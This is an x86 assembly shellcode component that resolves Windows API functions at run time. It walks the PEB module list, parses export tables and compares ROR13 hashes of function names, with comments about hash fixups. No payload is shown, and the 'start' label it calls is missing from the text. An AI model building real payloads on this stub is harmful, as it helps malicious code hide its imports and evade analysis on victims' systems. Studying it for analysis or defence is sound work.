global _start

_start:
cld				; clear direction flag
push ebp 
call start
; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.

api_call:
	pushad 			; save registers
	mov ebp,esp		; set ebp to be the stack pointer
	xor edx,edx		; zeroout edx
	mov edx,[fs:edx + 0x30]		;edx -> PEB
	mov edx,[edx + 0x0c]			; edx -> PEB.ldr
	mov edx,[edx + 0x14]			; edx-> PEB.ldr.InMemoryOrder.flink list
next_mod:
	mov esi,[edx + 0x28]			; esi - > module name (unicode)
	push edx						; save position in list 
	mov edx,[edx + 0x10]			; get this module base addr
	mov eax,[edx + 0x3c]			; jump over the PE header
	mov eax,[edx + eax + 0x78]		; eax = export table rva ; edx (module Base addr) ; eax (module based addr + PE header)
	test eax,eax					; test if no export table is present
	jz get_next_mod1				; if no EAT present process next module
	add eax,edx						; eax = export table va
	push eax						; save current module export table address
	mov ecx,[eax + 0x18]			; load ecx with the number of functions in module
	mov ebx,[eax + 0x20]			; ebx = rva of function names table
	add ebx,edx						; add the modules base addr ebx = absolute address of names table
get_next_func:
	jecxz get_next_mod				; if ecx = zero
	dec ecx							; decrease ecx
	mov esi,[ebx + ecx * 4]			; esi = rva of function ; ebx = &names table	;ecx = number of functions
	add esi,edx						; esi  = &function
	xor edi,edi						; zero out edi to hold the function hash
	xor eax,eax						; zero out eax 
loop_funcname:
; i had to fix this bit up to take hash of function only produced by get hashed by corelancoder and not to cimpute or use module hash
	lodsb							; load byte from esi to eax and increase esi
	test al,al						; compare al with ah (NULL) to see if we reached end of string 	
	jz compute_hash_finished
	ror edi,0xd						; rotate edi 13 bits to the right
	add edi,eax						; add byte to hash accumulator
	jmp loop_funcname				; loop until end of string is reached
compute_hash_finished:
	cmp edi,[ebp + 0x24]			; compare function hash with pushed(requested) hash
	jnz get_next_func				; if not found jump to next function
	; if found, fix up stack, call the function, else compute the next one
	pop eax							; pop current module EAT
	mov ebx,[eax + 0x24]			; ebx = ordinal table rva
	add ebx,edx						; ebx = &ordinal table
	mov cx,[ebx + 2 * ecx]			; get the desired function ordinal  ecx = function counter
	mov ebx,[eax + 0x1c]			; ebx = function address table rva
	add ebx,edx						; ebx = &address table
	mov eax,[ebx + 4 * ecx]			; eax =  function RVA
	add eax,edx						; eax = &function
;we know fixup the stack and call the function
finish:
; also there is a fixup here to accomodate stack changes done to shellcode
	mov [esp + 0x20],eax			; put function address instead of eax for next popad
	pop ebx							; clear postiion in Memory order list
	popad							; restore registers
	pop ecx							; pop to ecx the current return address
	pop edx							; pop to edx requested function hash
	push ecx						; push return address of caller
	jmp eax							; jump to function
	; we know return to the correct caller
get_next_mod:
	pop eax							; pop off the current now previous module EAT
get_next_mod1:
	pop edx							; restore our position in MemoryOrder List
	mov edx,[edx]					; get next module in list
	jmp short next_mod